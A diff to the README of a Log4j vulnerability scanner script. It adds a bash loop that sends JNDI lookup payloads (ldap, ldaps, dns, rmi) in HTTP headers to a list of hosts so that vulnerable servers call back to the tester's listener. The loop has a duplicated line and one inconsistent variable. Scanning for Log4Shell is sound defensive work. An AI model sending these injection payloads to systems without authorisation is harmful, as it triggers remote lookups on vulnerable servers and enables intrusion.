@@ -34,7 +34,10 @@ git clone https://github.com/defcon250/log4jScanner
   [Example: ./log4jScanner.sh 192.168.1.100:443 1389]
 
 ```
-## For testing against bunch of IP/URLs, please feel free to modify the script accordingly.
-
+## For testing multiple IP/URLs, please feel free to modify the script accordingly.
+```bash
+FOR loop example: 
+for i in $(cat "$VAR001"); do timeout 2 curl -ksqL http://"$i" -H "x-api-version: \${jndi:ldap://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1>  /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:dns://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null; timeout 2 curl -ksqL http://"$VAR001" -H "user-agent: \${jndi:rmi://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null; done
+````
 
 
